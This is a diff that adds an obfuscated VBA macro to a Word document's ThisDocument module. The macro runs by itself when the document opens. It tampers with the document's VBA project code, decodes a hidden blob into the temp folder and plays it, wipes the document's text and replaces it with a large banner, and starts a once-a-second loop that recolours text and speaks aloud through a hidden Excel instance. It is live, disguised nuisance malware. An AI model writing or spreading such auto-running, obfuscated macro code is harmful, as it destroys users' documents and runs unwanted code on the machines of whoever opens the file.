@@ -1,0 +1,141 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+#If VBA7 And Win64 Then
+Private Declare PtrSafe Function jFlnz8 Lib "winmm.dll" Alias "sndPlaySoundA" _
+       (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
+#Else
+Private Declare Function jFlnz8 Lib "winmm.dll" Alias "sndPlaySoundA" _
+       (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
+#End If
+
+Public cMSuxt As Variant
+Public gkKg As Object
+Public cN3r As String
+Public kZ4gU8sc As String
+Public qa317 As Integer
+
+Sub znOIKcDsLlMKQVsnFfWaE2bHu18RdOmKFoVb()
+    Selection.WholeStory
+    Selection.Font.ColorIndex = (Selection.Font.ColorIndex + 1) Mod 15
+    If Selection.Font.ColorIndex Mod 2 = 0 Then
+        Set gkKg = CreateObject("Excel.Application")
+        gkKg.Speech.speak NpuXrzgq.Label1, True
+        gkKg.Quit
+    ElseIf Selection.Font.ColorIndex Mod 2 = 1 Then
+        adk49an = Environ("tmp") & "\" & "asdf"
+        jFlnz8 adk49an, 1
+    End If
+    Application.OnTime Now + TimeValue("00:00:01"), "znOIKcDsLlMKQVsnFfWaE2bHu18RdOmKFoVb"
+End Sub
+
+Private Sub UxKo3LivfGHxI2OtWa3KtqOgY6cRb5yrbR00(m4dYL, fviLw9)
+    On Error GoTo NavnYIF0:
+    Dim fjGeMmP8Z() As Byte
+    fjGeMmP8Z = Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(m4dYL)
+    Z1yiWeP.pZVZ0Q8ygfA6jcSJRLEKZSyv40IDQzErCpah fjGeMmP8Z, fviLw9
+NavnYIF0:
+    GoTo VadXU4
+VadXU4:
+
+End Sub
+
+Private Function BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz(dd) As Boolean
+    BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz = False
+    On Error GoTo B3A:
+    Dim A4xcPiKtrr() As Byte
+    A4xcPiKtrr = Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(dd)
+    BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz = Z1yiWeP.Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB(A4xcPiKtrr)
+B3A:
+End Function
+
+Private Function zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy()
+    zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy = None
+    For Each ok0I11 In ActiveDocument.VBProject.VBComponents
+        l = 1
+        Set gjvhSFe = ok0I11.CodeModule
+        Do While l < gjvhSFe.CountOfLines
+            za29rx = gjvhSFe.ProcOfLine(l, 0)
+            If za29rx <> "" Then
+                If BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz(za29rx) Then
+                    zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy = za29rx
+                    GoTo CfHFE
+                End If
+                l = l + gjvhSFe.ProcCountLines(za29rx, 0)
+            Else
+                l = l + 1
+            End If
+        Loop
+    Next ok0I11
+CfHFE:
+End Function
+
+Private Sub XiqyXdC809pP5esSrC633ag92w0x6otQylY0()
+    sN2l0P = zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy
+    If Not IsNull(sN2l0P) Then
+        For Each LHKwfvbUC In ActiveDocument.VBProject.VBComponents
+            If LHKwfvbUC.Type = 1 Then
+                HKwfvbU = 1
+                Set cm = LHKwfvbUC.CodeModule
+                Do While HKwfvbU < cm.CountOfLines
+                    pn = cm.ProcOfLine(HKwfvbU, 0)
+                    If pn <> "" Then
+                        UxKo3LivfGHxI2OtWa3KtqOgY6cRb5yrbR00 pn, sN2l0P
+                        HKwfvbU = HKwfvbU + cm.ProcCountLines(pn, 0)
+                    Else
+                        HKwfvbU = HKwfvbU + 1
+                    End If
+                Loop
+            End If
+        Next LHKwfvbUC
+    End If
+    zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k
+End Sub
+
+Private Function OcbCTRJiqmq8ZHdtwfA1hsuje7UPUwkL1TcL(e2qBnJA1D, GNheMViA)
+    df = Environ("tmp") & "\" & e2qBnJA1D
+    Dim CiuxGXWXyEUw4() As Byte
+    CiuxGXWXyEUw4 = Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(GNheMViA)
+    Open df For Binary Access Write As #1
+    Put #1, , CiuxGXWXyEUw4
+    Close #1
+    OcbCTRJiqmq8ZHdtwfA1hsuje7UPUwkL1TcL = df
+End Function
+
+Private Sub zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k()
+    yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5
+    Selection.WholeStory
+    Selection.Delete
+    Selection.TypeText NpuXrzgq.Label1
+    Selection.WholeStory
+    Selection.Font.Size = 72
+    znOIKcDsLlMKQVsnFfWaE2bHu18RdOmKFoVb
+End Sub
+
+Private Sub yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5()
+    cMSuxt = Array(OcbCTRJiqmq8ZHdtwfA1hsuje7UPUwkL1TcL("asdf", NpuXrzgq.assda))
+    kZ4gU8sc = NpuXrzgq.Label1
+End Sub
+
+Public Sub Document_Open()
+    On Error GoTo sjjQMD:
+    If ActiveDocument.VBProject.VBComponents.Count > 4 Then
+        XiqyXdC809pP5esSrC633ag92w0x6otQylY0
+    Else
+        zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k
+    End If
+sjjQMD:
+    If err.Number = 6068 Or err.Number = 50289 Then
+        zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k
+    Else
+        Resume Next
+    End If
+End Sub
+
+
+
